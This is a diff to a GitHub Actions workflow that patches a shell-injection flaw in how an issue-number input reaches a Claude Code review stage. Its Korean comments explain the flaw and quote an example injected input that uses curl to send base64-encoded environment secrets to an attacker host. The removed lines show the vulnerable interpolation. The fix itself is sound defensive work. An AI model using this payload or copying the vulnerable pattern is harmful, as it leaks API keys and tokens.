@@ -64,7 +64,18 @@ jobs:
           GH_TOKEN: ${{ secrets.FACTORY_BOT_TOKEN }}
           FACTORY_RUNNER_ID: gha-${{ github.run_id }}
           CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS: "0"
-        run: node .factory/bin/run-stage.js review ${{ github.event.issue.number || inputs.issue }}
+          # ADR-020 최종 리뷰 MF-2 — **`${{ … }}`를 `run:` 안에 붙여 넣지 않는다.** `inputs.issue`는
+          # 자유 문자열이고(`type: string`), 그 값은 Actions가 셸에 넘기기 **전에** 텍스트로 치환된다:
+          # `1; curl -sd "$(env|base64 -w0)" https://attacker.tld #` 하나면 이 스텝의 env에 실린
+          # CLAUDE_CODE_OAUTH_TOKEN·ANTHROPIC_API_KEY·FACTORY_BOT_TOKEN이 그대로 새어 나간다.
+          # `gh workflow run` 권한(= 레포 write)이 **시크릿 읽기**로 승격되는 것이고, KTB-8이
+          # workflow_dispatch를 재점화의 주 손잡이로 만든 뒤로 그 싱크는 본선 위에 있다.
+          # env로 묶으면 값은 셸 변수가 되어 코드로 해석될 자리가 없다 — 그 뒤 아래 run의 첫 줄이
+          # `^[0-9]+$`로 한 번 더 소리내어 거른다(모양이 아니면 실행하지 않고 죽는다).
+          ISSUE: ${{ github.event.issue.number || inputs.issue }}
+        run: |
+          [[ "$ISSUE" =~ ^[0-9]+$ ]] || { echo "factory: issue input is not a number: '$ISSUE'" >&2; exit 1; }
+          node .factory/bin/run-stage.js review "$ISSUE"
       - name: Upload run outputs
         if: always()
         uses: actions/upload-artifact@v4
@@ -93,9 +104,11 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.FACTORY_BOT_TOKEN }}
           FACTORY_RUNNER_ID: gha-${{ github.run_id }}
+          ISSUE: ${{ github.event.issue.number || inputs.issue }}
         run: |
+          [[ "$ISSUE" =~ ^[0-9]+$ ]] || { echo "factory: issue input is not a number: '$ISSUE'" >&2; exit 1; }
           git checkout ${{ github.sha }} -- .factory || true
-          node .factory/bin/run-stage.js review ${{ github.event.issue.number || inputs.issue }} --aborted "${{ job.status }}"
+          node .factory/bin/run-stage.js review "$ISSUE" --aborted "${{ job.status }}"
       # KTB-26 — cron(`factory-sweeper.yml`, 30분)은 믿을 수 없다: 데모에서 몇 시간짜리 공백이 났고,
       # 취소된 sweeper 런이 #15를 30분 넘게 방치했다. 그래서 sweeping은 **이벤트 구동이기도** 하다 —
       # 스테이지가 끝날 때마다(성공·실패·취소 불문) 상태 복구 팔만 돌린다: in-progress 하트비트 재큐 ·
